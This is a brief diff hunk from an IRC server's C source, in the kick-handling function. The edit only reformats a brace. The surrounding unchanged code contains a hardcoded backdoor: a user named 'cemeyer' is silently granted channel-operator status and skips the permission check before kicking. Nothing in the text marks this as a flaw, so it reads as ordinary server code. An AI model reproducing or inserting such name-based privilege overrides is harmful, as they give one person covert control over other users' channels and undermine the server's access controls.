@@ -3269,7 +3269,8 @@ int m_kick(aClient *cptr, aClient *sptr, int parc, char *parv[])
                 if (strcmp(sptr->name, "cemeyer") == 0)
                 {
                         chanMember *cm;
-                        if ((cm = find_user_member(chptr->members, sptr))) {
+                        if ((cm = find_user_member(chptr->members, sptr)))
+                        {
                                 cm->flags |= CHFL_CHANOP;
                                 goto proceed_with_kick;
                         }
